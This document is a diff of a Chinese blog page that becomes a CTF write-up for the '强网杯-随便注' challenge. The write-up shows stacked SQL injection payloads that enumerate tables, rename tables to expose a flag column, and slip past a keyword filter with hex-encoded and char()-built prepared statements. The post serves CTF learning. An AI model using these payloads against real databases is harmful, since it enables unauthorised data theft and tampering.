@@ -15,15 +15,22 @@
 
 
 
-<meta name="description" content="myctf">
-<meta name="keywords" content="ctf">
-<meta property="og:type" content="website">
-<meta property="og:title" content="lingxin16">
-<meta property="og:url" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;tags&#x2F;%E7%AE%A1%E9%81%93%E7%AC%A6&#x2F;index.html">
+<meta name="description" content="通过简单的注入 11&amp;#39;21&amp;#39;#31&amp;#39;;order by 1;#41&amp;#39; union select 1,2#  得出有过滤规则">
+<meta name="keywords" content="sql注入,buuctf,堆叠注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯-随便注">
+<meta property="og:url" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;01&#x2F;12&#x2F;[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8&#x2F;index.html">
 <meta property="og:site_name" content="lingxin16">
-<meta property="og:description" content="myctf">
+<meta property="og:description" content="通过简单的注入 11&amp;#39;21&amp;#39;#31&amp;#39;;order by 1;#41&amp;#39; union select 1,2#  得出有过滤规则">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;01&#x2F;12&#x2F;[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8&#x2F;%E6%9F%A5%E5%BA%93.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;01&#x2F;12&#x2F;[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8&#x2F;%E6%9F%A5%E8%A1%A8.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;01&#x2F;12&#x2F;[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8&#x2F;words%E8%A1%A8.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;01&#x2F;12&#x2F;[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8&#x2F;%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8%5C%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%90%8D.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;01&#x2F;12&#x2F;[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8&#x2F;flag.png">
+<meta property="og:updated_time" content="2020-01-31T17:33:04.205Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;01&#x2F;12&#x2F;[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8&#x2F;%E6%9F%A5%E5%BA%93.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -55,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Tag: 管道符 | lingxin16</title>
+<title>强网杯-随便注 | lingxin16</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -65,9 +72,9 @@
         fancybox: true,
         animate: true,
         isHome: false,
-        isPost: false,
+        isPost: true,
         isArchive: false,
-        isTag: true,
+        isTag: false,
         isCategory: false,
         fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
         scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
@@ -263,56 +270,202 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap">
+      <div class="body-wrap"><article id="post-[强网杯]随便注" class="article article-type-post" itemscope itemprop="blogPost">
   
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2020/01/01/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-      <time datetime="2019-12-31T17:01:18.000Z" itemprop="datePublished">01-01</time>
+    <div class="article-meta">
+      <a href="/2020/01/12/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="article-date">
+      <time datetime="2020-01-12T07:06:22.000Z" itemprop="datePublished">2020-01-12</time>
 </a>
 
 
-        </div>
-         
+    </div>
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/01/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/">管道符漏洞</a>
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      强网杯-随便注
     </h1>
   
 
-        <div class="article-info info-on-archive">
-          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
 
-          
+        
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AE%A1%E9%81%93%E7%AC%A6/" rel="tag">管道符</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/buuctf/" rel="tag">buuctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" rel="tag">堆叠注入</a></li></ul>
     </div>
 
-        </div>
         <div class="clearfix"></div>
-    </header>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>通过简单的注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">1&#39;#</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">1&#39;;order by 1;#</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2#</span></pre></td></tr></table></figure>
+
+<p>得出有过滤规则</p>
+<a id="more"></a>
+
+<p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
+<p>一些select update delect语句都被过滤了</p>
+<p>那么我们就用堆叠注入（不要问为什么，我百度来的）</p>
+<p>首先介绍一下堆叠注入，简单来说就说将多条语句并列执行（语句1;语句2）同时执行语句1,2</p>
+<p><code>1‘;show databases;#</code>   查数据库</p>
+<p><img src="/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/%E6%9F%A5%E5%BA%93.png" alt="查库"></p>
+<p><code>1‘;show tables;#</code>   查表 发现有两个表</p>
+<p><img src="/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/%E6%9F%A5%E8%A1%A8.png" alt="查表"></p>
+<p><code>1&#39;;show columns from 1919810931114514;#</code>   </p>
+<p><code>1&#39;;show columns from words;#</code>   </p>
+<p>分别查第一张表和第二张表</p>
+<p>这里的1919810931114514要用反引号`括起 （数字串为表名的表操作时要加反引号）</p>
+<p><img src="/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/words%E8%A1%A8.png" alt="words表"></p>
+<p>在第一张表中发现了flag字段 但是只有words表有回显，然后看了一下大佬的绕过规则</p>
+<p>这里通过修改表名<img src="/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8%5C%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%90%8D.png" alt="修改表名"></p>
+<p><code>1&#39;;rename tables &#39;words&#39; to &#39;words1&#39;;rename tables &#39;1919810931114514&#39; to &#39;words&#39;; alter table &#39;words&#39; change &#39;flag&#39; &#39;id&#39; varchar(100);#</code></p>
+<p>然后用1’ or 1=1#得到flag</p>
+<p><img src="/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/flag.png" alt="flag"></p>
+<p>这里还有大佬的另外几种绕过方式（通过mysql预处理）</p>
+<p>语句1：</p>
+<p><code>1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</code></p>
+<p>是将select * from ’1919810931114514‘转化为16进制</p>
+<p>语句2；</p>
+<p><code>1&#39;;SET @sql=concat(char(115,101,108,101,99,116),&quot; * from 1919810931114514&quot;);PREPARE sqla from @sql;EXECUTE sqla;#</code></p>
+<p>(char(115,101,108,101,99,116)是把s e l e c t的ascii码转换为字符连接起来，再把后面的拼接起来就成了select * from ‘1919810931114514’)</p>
+
+      
+    </div>
+    
   </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2020/01/12/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/">强网杯-随便注</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">liu</a></p>
+        <p><span>发布时间:</span>2020-01-12, 15:06:22</p>
+        <p><span>最后更新:</span>2020-02-01, 01:33:04</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/01/12/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/" title="强网杯-随便注">http://lingxin16.github.io/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://lingxin16.github.io/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/　　作者: liu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2020/01/29/%5B%E6%8A%A4%E7%BD%91%E6%9D%AF2018%5Deasy_tornado/">
+                    护网杯2018-easy_tornado
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/">
+                    创建单页
+                </a>
+            </div>
+        
+    </nav>
+
+  
 </article>
-  
-  
-    </div></section>
-  
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"强网杯-随便注　| lingxin16　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
 
     
 
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2020/01/29/%5B%E6%8A%A4%E7%BD%91%E6%9D%AF2018%5Deasy_tornado/" title="上一篇: 护网杯2018-easy_tornado">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/" title="下一篇: 创建单页">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/02/01/%5BHgame%5DWeek1-web/">Hgame-Week1-web</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/29/%5B%E6%8A%A4%E7%BD%91%E6%9D%AF2018%5Deasy_tornado/">护网杯2018-easy_tornado</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/12/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/">强网杯-随便注</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/">创建单页</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/01/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/">管道符漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/19/burp%E7%88%86%E7%A0%B4/">burp爆破</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/">墨者学院</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/05/write-up/">write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/05/ceshi/">ceshi</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
 </div>
       <footer id="footer">
     <div class="outer">
